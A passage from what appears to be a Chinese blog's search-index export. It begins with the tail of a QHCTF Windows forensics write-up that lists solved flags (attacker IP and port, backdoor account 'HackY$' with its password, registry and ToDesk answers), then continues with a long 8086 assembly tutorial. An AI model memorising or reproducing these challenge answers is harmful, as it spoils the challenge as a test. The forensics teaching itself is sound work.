Image工具-&gt;转换raw-&gt;通过qume-img-&gt;转换vmware虚拟磁盘，导入虚机即可\nWin_011.找出系统中蛤客的ip地址及端口，提交方式请以QHCTF{md5(127.0.0.1:80)}进行提交，例如：QHCTF{cef54f47984626c9efbf070c50bfad1b}\n动态调试系统发现Server2.exe是被删除的，通过取证工具给他拖出来，就是在HackY$的开机启动目录拖出来之后各种沙箱分析，最终在安恒的沙箱中出现了一个ipflag即QHCTF{md5{192.168.20.1:8000}}即QHCTF&#123;ad4fdee2eada36ec3c20e9d6311cf258&#125;\nWin_022.蛤客在控制小明的系统后，创建了一个最高权限的后门账户，请你找出该账户的用户名及密码，提交方式请以QHCTF{md5(user_password)}进行提交，例如：QHCTF{cef54f47984626c9efbf070c50bfad1b}参考文档https://blog.51cto.com/u_16747374/12268420获取账号密码hash，最红hash解密为123456即账flagQHCTF&#123;md5(HackY$_123456)&#125;即QHCTF&#123;fb484ad326c0f3a4970d1352bfbafef8&#125;\nWin_044.蛤客在系统数据库中藏了一些东西，请你找出其中的flag值动态取证直接去cmd打开regedit就可以直接拿到flag，这是最快的方法，它默认退出的位置就是他设置flag的位置，也可以通过一个reg文件获取，进去直接搜索QHCTF即可拿到flag\nWin_055.小明在找你帮忙之前，喊了他的一位好友帮他先行取证，请你找出他好友远程所使用的软件，并找出控制了多少秒，ip是什么，提交方式请以QHCTF{md5(xxxx_10_127.0.0.1)}进行提交，例如：QHCTF{cef54f47984626c9efbf070c50bfad1b}在下载目录中Download中，有两个Todesk，去翻找它们的日志文件，也可以直接从去取证大师中直接拿到ip和时间flag即QHCTF&#123;md5(Todesk_781_223.104.132.99)其中时间计算他这里是有误的，他这个时间计算是779，可能存在计算误差，挨个累加尝试到781成功即flagQHCTF&#123;dca8df29e49e246c614100321e3b932e&#125;\nWin_077.蛤客在home目录中存放了一个恶意程序，请你分析该程序，并找到其中的flag值在HackY$的Desktop(桌面)中存放着这个内容，通过执行命令set拿到环境变量，即密码拿到密码解密内容为即flagQHCTF&#123;6143b46a-8e98-4356-a9b2-251a7ec19e51&#125;\n","categories":["CTF相关","WriteUp"],"tags":["CTF","WriteUp","WEB","CRYPTO","MISC","REVERSE","PWN","Forensics"]},{"title":"8086CPU汇编学习","url":"/2025/03/10/8086CPU%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/","content":"写在前面没想到我有一天会去研究汇编，这是我从未设想的道路。😭\n学习环境安装项目地址： https://github.com/HaiPenglai/bilibili_assembly/教学视频： https://www.bilibili.com/video/BV1eG4y1S7R5安装配置具体可以参考视频，非常详细，本文不多介绍环境的安装与配置。\n基础指令与寄存器Debug命令概述Debug是DOS、Windows都提供的实模式(8086 方式)程序的调试工具。使用它，可以查看CPU各种寄存器中的内容，内存的情况和机器码级跟踪程序的运行。\n功能\nR命令 查看、改变CPU寄存器的内容。\nD命令 查看内存中的内容。\nE命令 改写内存中的内容。\nU命令 将内存中的机器指令翻译成汇编指令。\nT命令 执行一条机器命令。\nA命令 以汇编指令的格式在内存中写入一条机器指令。\n\n寄存器层级在 x86 架构的汇编语言中，寄存器的命名和使用方式有一定的规律。在Debug中，使用R指令可以看到寄存器中的内容以AX为例，他的内容是0000，他拥有16位，在汇编指令中AX即直接代表这个16位寄存器，如果是AH和AL则代表8位寄存器，H是高位，L是低位，当前是X86的，如果是64的他还有32位，即EAX。\nMOV指令MOV是做替换，在DEBUG中，执行下面汇编指令\nmov ah,13mov bl,33mov ch,al\n执行过后ax寄存器的高位变成了13，bx的低位变成了33，cx的低位变没变，因为他把cx的高位修改成了ax的低位，ax的低位本身没内容即00。\nADD指令ADD是做加法，在DEBUG中，执行下面汇编指令\nadd ax,13add bx,8add cx,bx\nAX从1300变成了1313，因为加了13，bx从0033变成了003B，他这里展示的是16进制，3+8&#x3D;11，11刚好对应B，然后CX本身就是0000，加上bx那就是003B\nSUB指令SUB是做减法，在DEBUG中，执行下面汇编指令\nsub ax,8mov bx,Fsub ax,bx\n第一条是1313-8，即130B(11)，之后bx改为F(15)，用ax即130B-F则AX&#x3D;12FC，相当于130B(11)-15 12F(15)C(12)\nMUL指令mul是乘法指令，使用mul做乘法的时候需要注意下面两点\n\n相乘：两个相乘的数，要么都是8位，要么就都是16位。如果是8位，一个默认放在AL中，另一个放在8位reg或内存字节单元中，如果是16位，一个默认在ax中，另一个放在16位reg或内存字单元中。\n结果：如果是8位乘法，结果默认放在AX中，如果是16位乘法，结果高位默认在DX中存放，低位在AX中放。\n\n例如我要做100*10的运算，他应该是执行下面的汇编代码\nmov al,64mov bl,Amul bl\n64是100的16进制，A是10的16进制，然后mul是运算，得到03E8，03E8刚好是1000的16进制。下面做一个100*10000的运算，他会不会出现溢出？100小于255，可是10000大于255，所以必须走16位的乘法，汇编代码如下\nmov ax,64mov bx,2710mul bx\n这个正常的答案应该是1000000，16进制即F4240，在执行之后的结果中，因为位数不够他会把低位放到AX中，高位放到DX中，DX即F，AX就是4240，实际就是F4240即1000000。\nDIV指令div是除法指令，使用div做除法的时候应该注意一下问题\n\n除数：有8位和16位两种，在一个reg或内存单元中。\n被除数：默认放在AX或DX和AX中，如果除数为8位，被除数则为16位，默认在AX中存放；如果出书为16位，被出示则为32位，在DX和AX中存放，DX存放高位16位，AX存放低位16位。\n结果：如果除数为8位，则AL存储触发操作的商，AH存储触发操作的余数；如果储是为16位，则AX存储除法操作的商，DX存储法操作的余数。\n\n下面做一个10000&#x2F;100的一个计算，10000的16进制是2710，100的16进制是64，那么计算的汇编代码将是这样\nmov ax,2710mov bl,64div bl\n运行div之后他把答案最终放置到了ax中，64即16进制的100，10000&#x2F;100&#x3D;100上面这种情况一个是被除数是16位，如果计算1000000&#x2F;10000，10000000的16进制数是F4240，很显然16位数是放不下的，那就需要把高位放到dx中，参考下面的汇编代码\nmov dx,Fmov ax,4240mov bx,2710div bx\n成功运行那道ax中的运行结果64即10进制的100。如果运算结果中有余数呢？这里也可以做一下试验，1000001&#x2F;10000的结果应该是100余1，我们执行下面汇编代码来查看结果\nmov dx,Fmov ax,4241mov bx,2710div bx\n这里发现余数会存储在dx寄存器中。上面的是一个32位占用的被除数，如果被除数是8位，则AL存储除法操作的商，AH放余数，可以参考10001&#x2F;100，汇编代码如下\nmov ax,2711mov bl,64div bl\n结果应该是100余1，对应的al的值则就是64，ah的值则就是1\nAND指令and指令的作用是按位进行与运算，举个例子0和0则就是0，1和0还是0，1和1即1，参考汇编代码\nmov al,63(01100011B)and al,3B(00111011B)\n执行过后会把内容丢到al中，运行结果应该是00100011即16进制的23。\nOR指令or指令的作用是按位进行或运算，举个例子0和0就是0，1和1就是1，1和0就是1，0和1也是1，参考汇编代码\nmov al,63(01100011B)or al,7B(01111011B)\n二进制结果应该是01111011，16进制即7B。\nSHL和SHR指令shel和shr分别代表左移和右移，左移就是左边去除一个右边补0，右移则就是右边移除一个左边补零。如下图参考汇编代码如下\nmov al,63shl al,1shr al,1\n63的二进制是01100011即16进制63，左移一位二进制变成11000110即16进制C6，右移一位则就变回去了即01100011即16进制的63。\nROL和ROR指令他俩是循环左移和循环右移，他和普通的左移和右移区别是，循环左移是把最右边的一位补到最左边，循环右移是把最左边的一位补到右边，参考下面的汇编代码查看区别\nmov al,FFrol al,1shl al,1\nFF的2进制是11111111，不管是循环左移还是右翼都是会把一边的1补到另一边，而shl和shr是补0。\nINC和DEC指令INC和DEC的作用是增加1和减少1，例如C语言中的++和–，例子汇编代码如下\nmov al,1inc aldec al\n这个不错介绍，需要注意的是，如果本身是al是00，再去给他dec(–)那么他就会变成FF，对应的如果是al是FF再去给他inc(++)那就会变成00。\nNOP指令这个指令是空代码段，执行不会干任何事情，他所占的空间恰好是1个字节。这里不多说，后面会用到。\nXCHG指令xchg指令的作用是做数据调换，参考下面汇编代码\nmov al,11mov bl,22xchg al,bl\nal和bl的内容互换了，如果是不通过这个指令来去作交换，则需要三个地方存储数据，A把数据给C，然后B把数据给A，再然后C给B这样才能呼唤，这个指令可以直接交换。\nNEG指令neg的作用是取反并加 1，如果原数据为00000001，通过neg取反+1就是11111110+00000001，具体汇编代码参考如下\nmov al,1neg al\n00000001取反就是11111110，再去加1那就是FF了，这里不多说。\nINT指令INT指令的含义是中断，在做除法运算的时候如果除数为0那就会自动触发int 0这个指令，也可以手动执行这个指令，这个指令最终会把内存的执行指针做一个跳转，跳转到最初的位置，具体参考案例如下，第一个是除法除以0，汇编代码如下\nmov ax,123mov bl,0div bl\n运行到div命令开始执行除法的时候，把CS和IP调到F000和1060，这个就是执行int 0会发生的事，出现问题则会跳转到这个位置。第二个例子直接运行int 0\nint 0\n这俩寄存器是用来存储执行代码位置的，他这里直接跳转了。中断编号有很多，这里是调用的0，除法出现错误也会调用中断0，还有很多后面慢慢接触就可以了。\n进阶指令与寄存器物理地址、段地址、偏移地址关系我这里说的都是基于8086CPU的内容，其他的可能和我这个不一样的。CPU在访问内存的时候，会用一个基础地址(段地址*16)和一个相对地址的偏移地址相加，给出内存单元的物理地址。更一般的说，8086CPU的这种寻址功能是“基础地址+偏移地址&#x3D;物理地址”寻址模式的一种具体实现方案。8086CPU中，段地址x16可看作是基础地址。\n段寄存器在8086CPU中，访问内存时要由相关部件提供内存单元的段地址和偏移地址，送入地址加法器合成物理地址。这里，需要看一下，什么是部件提供段地址。段地址在8086CPU中段寄存器中存放。8086CPU有4个段寄存器：CS、DS、SS、ES。当8086CPU要访问内存时由这四个段寄存器提供内存单元的段地址。\n关于内存写入数据通过Debug程序的e命令可以直接对内存中的数据做修改，可以参考下面截图\nDS寄存器-数据段地址CPU要读写一个内存单元的时候，必须先给出这个内存单元的地址，在8086PC中，内存地址由段地址和偏移地址组成。8086CPU中有一个DS寄存器，通常用来存放要访问的数据的段和地址。举个例子，通过下面debug命令在21f6:0000的位置写入一点内容，命令如下再去修改DS寄存器的内容，DS寄存器的内容应该是数据段的地址，例如采用debug命令去直接修改DS(段寄存器是不可以直接mov数值修改，需要通过其他寄存器进行赋值)寄存器的内容，参考命令截图如下通过mov去赋值DS\nmov ax,21f6mov ds,ax\n要注意直接去mov ds,21f6是不可行的，他是一个段寄存器在设计的时候就不允许这样。去执行下面的汇编代码\nmov al,[0]\n执行之后结果如下al寄存器变成了12，这个12是哪里来的呢？在执行mov指令的时候，给的值是[0]这个值是指基于数据段地址的偏移，也就是基于DS,21F6这个位置的第0偏移的数据内容给al，即12。在看一个案例，还是上面的内容，执行下面的汇编指令\nmov bx,[2]\n结果如下为什么BX是7856？bx给的是216f的第2位，也就是从56开始，数值应该是5678，变成7856的原因是因为他要对其高低位，低位在bl，高位在bh，高位是78，低位是56，对其之后bx就是7856。\nCS和IP指令CS和IP是8086CPU中两个最关键的寄存器，它们指示了CPU当前要读取指令的地址。CS为代码段寄存器，IP为指令指针寄存器，从名称上我们可以看出它们和指令的关系。先看个案例，我们先在2000:0000的位置写入一些汇编指令，参考指令如下\na 2000:0000mov ax,0123mov bx,0003mov ax,bxadd ax,bx\n执行过后看一下对应位置的内容，发现里面的内容根本看不懂，这里的内容是刚才汇编指令的机器码，可以使用debug的u命令去看这些内容到底是执行的什么内容，参考下图使用u命令可以看到咱们刚才输入的指令，具体怎么执行这些指令呢，这里就可以通过修改cs和ip寄存器来指定咱们写入命令的位置，再去使用t即可执行咱们这些指令，具体操作如下图这个时候就相当于命令的指针指向了这里，通过t命令去执行命令结果如下发现咱们再2000:0000设置的指令都依次执行了。\nJMP指令jmp是一个跳转指令，具体的作用可以做一个实践，根据下图把命令写入内存。具体命令参考如下我们把指针跳转到2000:0000开始执行命令，具体命令参考如下当我们执行第二次的时候也就是命令jmp 1000:3的时候，cs和ip变成了1000和0003，下一个命令就会去执行mov ax,0000了，继续执行查看结果继续执行会发现，他后面会有个jmp指令，jmp的参数是bx，bx是0000，就是把ip改为0000，那就是从mov ax,0123从头继续执行，然后一直重复，如果一直去执行那么这就是一个死循环。\n栈概念栈是一种后进先出的数据结构，通常用于存储临时数据、管理函数调用和返回地址。栈在内存中通常从高地址向低地址增长，用于保存寄存器值、局部变量等。简单说，就是程序运行时的“临时记事本”。\nSS和SP寄存器这两个寄存器用来定义栈顶的位置，基于栈的操作都是基于这俩寄存器指定的位置来做操作。这俩也是段指令，无法直接mov xx,数值来直接赋值，得通过mov 寄存器,段寄存器来修改，或者通过debug名的r命令去修改。\nPUSH和POP指令push就是压栈，指的是将一个元素添加到栈的顶部。pop就是出栈，指的是从栈的顶部移除并返回一个元素。push和pop指令具体可以参考下图下面做个实验，我们先指定1000:0010这块内存作为栈实验的栈顶，用来做压栈和出栈的实验，通过debug的r命令来修改ss和sp段寄存器，如下图我们根据最上面的指令进行操作，我们先把指令写进去然后一步一步去执行，具体的汇编指令如下\nmov ax,0123push axmov bx,2266push bxmov cx,1122push cxpop axpop bxpop cx\n先去执行前两条查看一下栈里的内容有啥变化0123被压入栈了，而且是顶部，并且SP也发生了更变，我们继续把压栈的命令都执行完，还剩4条，看一下结果全部压进去了，并且位置是往小的来推进的。接着我们继续执行指令，还有三条pop指令，先执行一条查看一下效果原本栈内的2211，已经被丢到ax中了，并且他是把第一个丢到低位，然后第二个丢到高位中，这个操作不回去平衡高低位。接着继续执行两个pop命令，执行结果如下栈内的数据以此丢到了bx和cx中了，并且栈内也没内容了，这里的内容其实我举得例子不好，应该找一块全空的位置来去做这个实验。这里他自动填充了其他数据。\nBX寄存器的独特性bx寄存器有一个额外的作用，就是它可以来指明内存单元，这个是其他大部分寄存器做不到的，举个例子，在2000:100的位置放一些数据，命令如下修改DS数据段的地址为2000，然后通过偏移位置来去设置其他寄存器的内容，命令如下这里发现ax成功更变成了2000:100位置的内容，这个在上面也进行过，下面开始通过bx来去当作编译来去拿数据，命令如下\nmov bx,0102mov ax,[bx]\n这里发现通过bx的偏移设置了ax的内容，他还有其他的写法，具体命令如下\nmov ax,[bx-1]\n这样也是可以的，本身bx是0102通过[bx-1]那就是0101的偏移位置来写入ax，把寄存器当作偏移的操作只有bx能做到，尝试其他的会报错，具体错误可以参考下图使用mov cx,[ax]和mov ax,[cx]都是不可行的，这个功能是bx单独的功能但不是他独有的功能，后面会说其他的，这个bx寄存器也一般用来存储偏移地址。\nSI和DI寄存器si和di是8086CPU中和bx功能相近的寄存器，si和di不能够分成两个8位寄存器来使用。具体使用方法和上面BX寄存器一样。然后这些可以用来当作偏移来用的寄存器可以相加，例如下面汇编指令\nmov cx,[bx+si]mov cx,[bx+di]# 下面这个不允许mov cx,[si+di]\nBP寄存器他和上面的BX、SI、DI用处都是可以指明内存单元。但是BP在用法上和它们三个是有区别的，BX、SI、DI采用这三个寄存器去寻址的时候，他是基于DS寄存器来做偏移找内容，而BP是基于SS寄存器，这个SS寄存器上面也讲述了他是用来设置栈顶的段地址的，BP也可以理解为基于栈顶的位置偏移找内容。具体可以参考下面的案例，我在5000:0000和6000:0000的位置存放了一些内容，一个正序一个倒叙下面我把这俩位置分给数据段地址和栈顶的位置，参考下面代码之后开始测试数据，具体执行的汇编代码如下\nmov bx,0001mov ax,[bx]mov bp,0001mov ax,[bp]\nax现在的内容是5000:0000位置偏移为1的内容，我们再去看bp的内容，继续执行两次查看结果ax变成了A9CB，这里的内容是从6000:0000中拿出的。要注意的是bp是可以配合其他的寄存器和偏移使用的，但是他不可以配合bx寄存器来用，因为bx是基于DS寄存器的。具体参考下面汇编代码，以及报错输出\nmov ax,[bp]mov ax,[bp+1]mov ax,[bp+si]mov ax,[bp+di]# bp和bx不能一起用mov ax,[bp+bx]\n错误输出如下\n寻址寄存器相关总结\n标志位寄存器CPU内部的寄存器中，有一种特殊的寄存器(低于不通的处理机，个数和结构都可能不同)具有以下三种作用。\n\n用来存储相关指令的某些执行结果。\n用来为CPU执行相关指令提供行为依据。\n用来控制CPU的相关工作方式。这些特殊的寄存器在8086CPU中，被称为标志寄存器。8086CPU的标志寄存器有16位，其中存储的信息通常被称为程序状态字(PSW)。我们已经使用过8086CPU的ax、bx、cx、dx、si、di、bp、sp、ip、cs、ss、ds、es等13个寄存器了，当前章节的标志寄存器(以下简称flag)是我们要学习的最后一个寄存器。flag和其他寄存器不一样，其他寄存器是用来存放数据的，都是整个寄存器具有一个含义。而flag寄存器是按位起作用的，也就是说，它的每一位都有专门的含义，记录特定的信息。8086CPU的flag寄存器的结构图如下flag的1、3、5、12、13、14、15位在8086CPU中没有使用，不具有任何含义。而0、2、4、6、7、8、9、10、11位都具有特殊的含义。在这一章节中，我们学习标志寄存器中的CF、PF、ZF、SF、OF、DF标志位，以及一些与其相关的典型指令。\n\nZF标志flag的第6位是ZF，0标志位。他记录相关指令执行后，其结果是否为0。如果结果为0，那么zf&#x3D;1；如果结果部位0，那么zf&#x3D;0。参考下面汇编指令，来去验证zf的变动\nmov ax,1sub ax,1\n执行结果在Debug中的体现如下图，先把ax改成1，执行之后NZ那个东西就是ZF标识即NoZero应该是这样理解，这是我自己理解的。然后等sub命令执行之后ax变成了0，ZF标志位变成了ZR，他代表zero\nPF标志flag的第二位是PF，奇偶标志位。他记录相关指令执行后，其结果的所有bit位中1的个数是否为偶数。如果1的个数为偶数，pf&#x3D;1，如果奇数，那么pf&#x3D;0。在命令中的具体体现可以参考下面汇编代码\nmov ax,0000add ax,1add ax,1add ax,1\n执行结果如下，pe即代表偶数也就是pf&#x3D;1，po即代表是奇数也就是pf&#x3D;0然后这里有个问题，算奇数偶数为什么ax的值是1和2的时候都是奇数呢？因为他算的是一个bit中的1的数量，ax&#x3D;0001的时候，他的bit8位表示是00000001他就一个1所以标识奇数,ax&#x3D;0002的时候，他的bit8位标识是00000010，还是一个1，所以还是一个奇数。\nSF标志负数如何表示？在二进制中，负数的表示方式通常采用 补码，它的计算方法如下：\n\n正数：与原码相同\n负数：\n先求该数的 绝对值的二进制（原码）。\n按位取反（0 变 1，1 变 0）。\n加 1（即 +1 操作）。\n\n\n\n假设使用 8 位二进制来表示 -5：\n\n+5 的二进制（原码）: 00000101\n按位取反: 11111010\n加 1: 11111011（即 -5 的补码）\n\n所以，-5 在 8 位二进制中表示为：11111011\n实验flag的第七位是SF，符号标志位。他记录相关指令后，结果是否为负。如果结果为负，SF&#x3D;1；如果非负，SF&#x3D;0。计算机中通常用补码来标识有符号数据。计算机中的一个数据可以看作是有符号数，也可以看成是无符号数。比如：\n\n00000001B，可以看作为无符号数1，或有符号数+1;\n10000001B，可以看作无符号数129，也可以看作有符号数-127；\n\n也就是说对于同一个二进制数据，计算机可以将他当作无符号数据来运算，也可以当作有符号数据来运算。比如下面汇编代码\nmov al,10000001B(81h)add al,1\n可以将add指令进行的运算当作无符号的运算，那么add指令相当于计算129+1，结果为130(10000010B)；也可以将add指令进行的运算当作有符号数的运算，那么add指令相当于计算-127+1，结果为-126(10000010B)。下面举个例子，执行下面汇编代码\nmov ax,0add ax,1sub ax,1sub ax,1add ax,1sub ax,1\n执行4次后的输出如下在mov的时候是ng即负，这应该是一个默认值，然后变成正数之后变成了PL，然后从0减到-1的时候变成了NG，好，继续运行继续运行是+1然后-1 变成0之后在变-1,对应的这里的SF标志也在变。\nCF标志flag的第0位是CF，进位标志位。一般情况下，在进行无符号数运算的时候，他记录了运算结果的最高有效位向更高位的进位值，活从更高位的借位值。对于位数为N的无符号数来说，其对应的二进制信息的最高位。看个例子，执行下面汇编代码\nmov al,10mov bl,10add al,blmov al,20mov bl,21add al,blmov al,98mov bl,98add al,bl\n先看前3个执行效果，如下CY代表进位，NC代表没有，也可以理解为进位，是否影响了更高位继续执行3个效果，运行结果如下这里al-20去加bl-21变成了41，更高位没有变化，所以都是NC，继续执行后三条指令，运行结果如下这里影响更高位了，98h+98h&#x3D;130h，所以变成了CY。\nOF标志在进行有符号运算的时候，如果结果超过了机器所能表示的范围称为溢出。那么什么是机器所能表示的范围呢？比如说，指令运算的结果用8位寄存器或内存单元来存放，比如，add al,3，那么对于8位的有符号数据，机器所能表示的范围就是-128127。同理，对于16位有符号数据，机器所能表示的范围是-3276832767。注意，这里所说的溢出，只是对有符号数运算而言。参考下面的例子，汇编代码如下\nmov ax,634mov al,63mov bl,62add al,blmov al,10mov bl,20add al,blmov al,ffmov bl,ffadd al,blmov al,aamov bl,aaadd al,bl\n先执行4次命令，结果如下第一竖行是OF标志位，第二竖行是CF标志位，OV就是代表溢出了，那为什么63h+62h就溢出了？他会产生一个正的197，如果是带符号的那就是负的59，而8位能表示的范围是-128~127，不带符号的结果出现了溢出。继续运行3次指令，结果如下这个是没有进位也没有溢出的结果，我们继续运行三次看一下结果FF+FF最终是1FE，没有溢出但是影响了最高位，好，我们继续看，再次执行3次指令，结果如下aa+aa的结果是154，高位进了，而且八位最高127，他这里154也溢出了。(这个位置其实我并没有理解，看了一会感觉应该是没那么重要，后面用到再回来看应该理解会更加深入一些，有清楚的大佬欢迎指正。)\nADC指令ADC是带进位加法指令，它利用了CF位上记录的进位值。具体用法参考下面汇编代码\nmov ax,2mov bx,1sub bx,axadc ax,1\n执行过后发现经过adc指令之后ax变成了4，ax(2)+1变成了4，为什么会这样呢？按照当前例子来算，他的加法原理是(ax)&#x3D;(ax)+(1)+CF，他在add基础上加上了一个CF标志位寄存器的内容，这个CF是一个进位的标志位，在第三条命令的时候bx(1)-ax(2)的时候借位了，而CF要么是0要么是1，借位的时候变成了1，他就会多加1，结果就变成4了。这个指令一般应用到下面场景，汇编代码如下\nmov ax,0198mov bx,0183add al,bladc ah,bh\n最终ax的结果是正确的，在al(98)+bl(83)的时候会产生进位，进位的那个一个数值会直接丢弃，通过adc计算高位就可以拿回刚才进位产生的一个数值。\nSBB指令sbb是带借位减法指令，它利用了CF位上记录的借位值。举个例子，汇编指令为sbb ax,bx最终的运算结果是(ax) &#x3D; (ax) - (bx) - CF这个指令和adc设计思想都是相同的，具体的例子这里不多讲述。虽然这两个命令并不常用，但是我们通过学习这两条指令，可以领会一下标志位寄存器CF位的作用和意义。\nCMP指令与跳转指令cmp是比较指令，cmp的功能相当于减法指令，只是不保存结果。CMP指令执行后，将对标志寄存器产生影响。其他相关指令通过识别这些被影响的标志寄存器位来得知比较结果。具体参考如下\nZF（零标志，Zero Flag）：如果比较结果为0（即目的操作数等于源操作数），ZF置1。SF（符号标志，Sign Flag）：结果的最高位（符号位）为1时，SF置1，表示结果为负。CF（进位标志，Carry Flag）：如果目的操作数小于源操作数（无符号数比较），CF置1。OF（溢出标志，Overflow Flag）：如果有符号数运算溢出，OF置1。PF（奇偶标志，Parity Flag）：结果低8位中1的个数为偶数时，PF置1。AF（辅助进位标志，Auxiliary Carry Flag）：低4位向高4位有进位时，AF置1。\n它通常与跳转指令配合使用，下面是一些常用的跳转指令\nJE    等于则转移         ZF=1JNE   不等于则转移       ZF=0JB    低于则转移         CF=1JNB   不低于则转移       CF=0JA    高于则转移         CF=0且ZF=0JNA   不高于则转移       CF=1或CF=1\n这些指令都比较常用，它们都很好记忆，它们的第一个字母都是J，表示JUMP；后面的字母表示含义如下\ne  表示equalne 表示not equalb  表示belownb 表示not belowa  表示abovenb 表示not above\n这里就不作实验了，后面会直接使用，具体可以参考下面章节的内容。\n源文件编写代码运行ASM源代码文件在最初安装学习环境的时候，工具包中提供了很多二进制命令，运行源码文件可以通过MASM去处理成OBJ文件，通过LINKE编译成可执行文件，然后通过debug去运行。具体参考案例如下先创建一个asm文件，内容如下\nassume cs:codesgcodesg segment    mov ax,0123H    mov bx,0456H    add ax,bx    add ax,ax    mov ax,4c00H    int 21Hcodesg endsend\n之后在DOSBox中执行MASM指令去处理，参考下面运行结果之后通过link去做编译此时这个目录下会多出一个CODE.EXE，因为这些代码并没有实际能实现什么效果，直接运行不会出现任何内容，可以采用debug的形式去运行他，参考下面结果\nLOOP指令对于汇编指令，loop指令是无法在debug中写的，因为他是要去写函数的，在debug中无法直接去写，他涉及了一些伪指令，需要去txt中去写。LOOP指令的作用是循环，CPU在执行LOOP指令的时候，要进行两步操作，先是(cx)&#x3D;(cx)-1，然后判断cx中的值，不为零则转至标号处执行程序，如果为0则向下执行。具体参考例子为计算2的12次方，参考代码如下\nassume cs:codecode segment    mov ax,2    mov cx,11s: add ax,ax\tloop s    code endsend\n执行4次结果如下loop干了一个偏移的事，把IP寄存器改成了0006，我们通过u命令查看一下这个位置的内容，如下图发现0006就是s函数中的内容。继续执行会发现一直在0006这个偏移中跳转，并且发现CX每到loop的时候都会-1一直到cx到0的时候IP到了000A，并且不再继续跳转，2的12次方也拿到了正确的数值要注意的是，loop执行之前，cx不要为0，因为它运行会先去给cx-1，然后去判断是否为0再去执行，cx如果是0然后-1，那么他就会变成FFFF，会一直把FFFF循环完，近似于一个死循环了……\nDebug指令G上面的loop案例都是通过debug的t指令一步一步执行的，我们也可以使用debug的g指令一次性执行到头，例如我们整个命令是到000A结束，参考下图我们可以直接通过debug的g命令运行到这个位置，使用结果如下图直接用G跳转到了000A并且成功运算出了结果。\nDebug指令P上面使用了t一步一步执行，也用了g一次性执行到某个位置，然后我再学习一下p指令，他的作用是把当前当前循环执行的命令一次性运行完。参考下面执行结果CX到A也就是10的时候我这里直接输入p一次性执行完循环了，直接成功运算出了结果。\nCALL与RET指令call和ret都是转移指令，他们都修改IP，或同时修改CS和IP。他们经常被共同用来实现子程序的设计。上面是简单创建了一个函数去使用，函数写进去之后，会被直接根据顺序直接调用，那么我们如何更优雅的去运行他们呢？这里就可以通过CALL和RET指令来去配合使用，具体参考下面代码\nassume cs:codecode segment    mov ax,2    mov cx,11    call s    int 21Hs: add ax,ax\tloop s    retcode endsend\n运行就不具体运行了，要注意的是int 21H这个中断，这个中断的含义是用来结束运行的，如果没有这个则会继续返回到call执行的下一个指令即运行s函数的内容，可能会造成于一个近似死循环的一个行为。。。\nRET和RETFret指令用栈中的数据，修改IP的内容，从而实现近转移；retf指令用栈中的数据，修改CS和IP的内容，从而实现远转移。具体应用的体现在哪呢？如果使用ret，他只能修改IP的内容，也就是偏移的值，但是偏移是有上线的，在8086CPU中，偏移的上线是FFFF，超过这个就回不去了，而retf还可以修改cs寄存器，这样修能实现远偏移。\ncall和“call far ptr”call和“call far ptr”的关系和ret与reft的关系基本对应，有一个近远的区别。具体使用就是下面代码\nassume cs:codecode segment    mov ax,3    mov cx,11    call far ptr s    int 21Hs: add ax,ax\tloop s    retfcode endsend\n我这里就不继续运行了，看一参考底部案例实践的内容。\nCALL指令的本质CPU执行CALL指令的时候，会进行两步操作，首先会把当前的IP或CS和IP压入栈中。然后转移到被调函数的位置。CALL指令不能实现短转移，除此之外，CALL指令实现转移的方法和JMP指令的原理相同。\nRET指令的本质当CALL指令把指针相关数据压入栈中，最终执行到RET的时候，会进行弹栈的操作，然后修改指针偏移。\n案例实践以下面代码为例,我们看一下栈中的内容\nassume cs:codecode segment    mov ax,2    mov cx,11    call s    int 21Hs: add ax,ax\tloop s    retcode endsend\n我们先设置一块空的地方为栈顶然后把命令执行到call s的下一条指令，看一下栈中的数据这里存储了一个0900，这个是高低位转换之后的，实际应该是0009，我们再看一下我们命令的偏移，如下图0009的偏移位置是直接ini 21刚好对应执行顺序，我们去运行到ret的时候会自动弹栈拿到这个位置，并跳转。一直到ret，CS和IP的内容更变如下这里是call和ret的对应关系，然后call far ptr和reft是对应的，远位转移在栈中存储的是CS和IP的位置，这个要注意，具体参考下图。\n代码中装载数据MASM内部以数据位的个数定义了多种数据类型\n\nBYTE，db，8bit\nWORD，dw，16bit\nDWORD，dd，32bit\nQWORD，dq，64bit\n\n我们通过debug用这些指令定义数据查看一下会CPU会执行什么内容\ndw 1234dw 456,789dw abcd,ef,123,456,789\n他把这些数据直接丢到了代码段，在汇编中，数据和指令是不会去做区分的，数据可以当作指令去执行，指令也可以当作数据去用。再去参考下面汇编代码\nassume cs:codecode segment    dw 0123h, 4567h, 89ABh    mov ax, 0code endsend\n把上面代码丢到debug中运行，再去查看代码段的内容会发现，前面数据都是对的，后面的mov指令变没了，出现这个问题主要是因为上面说的，数据和指令他不会去做区分，拿到什么内容既可以当作数据也可以当作命令，这里的数据堆起来之后变成了另外的命令，所以mov指令就没了想要做到分离数据与指令，可以通过下面的汇编代码\nassume cs:codecode segment    dw 0123h, 4567h, 89ABhstart: mov ax, 0code endsend start\n主要是在数据定义完之后通过start创建一个指令入口，我们放到debug中查看一下与上面的区别使用start的代码最终执行的时候IP会自动到指令的位置，而不是从头执行，虽然这里通过debug的u指令看到命令还是乱的，但是IP寄存器指向的位置却是一个正常的。\n将数据、代码、栈放入不同的段assume cs:code,ds:data,ss:stackdata segment    db &#x27;Hello, world!&#x27;    dw 123h, 456h, 789h, 0ABh,0defh    db 3 dup (1,2,3)    db 3 dup (&#x27;abc&#x27;,&#x27;def&#x27;)data endsstack segment    db 10 dup (0)stack endscode segment    start: mov ax, 0code endsend start\n参考上面汇编代码，其中cs、ds、ss分别用来定义不通的段，这三个具体的含义参考如下\n\ncs:code: 将代码段寄存器（CS）关联到名为 code 的段，表示程序的指令存放在 code 段。\nds:data: 将数据段寄存器（DS）关联到名为 data 的段，表示程序的数据存放在 data 段。\nss:stack: 将堆栈段寄存器（SS）关联到名为 stack 的段，表示程序的堆栈存放在 stack 段。\n\n然后这里还引入了一个dup指令，他的含义是数据需要多少份来放到对应的位置。例如上面的db 10 dup (0) 意为创建10份为0的数据。再data段的dw指令，后面的数据为什么都带0，原因是因为MASM是不支持16进制以字母开头的，全字母需要使用0来作为前缀然后这里再具体说一下start的含义，他是用来定义代码运行的起始位置的，然后后面的end 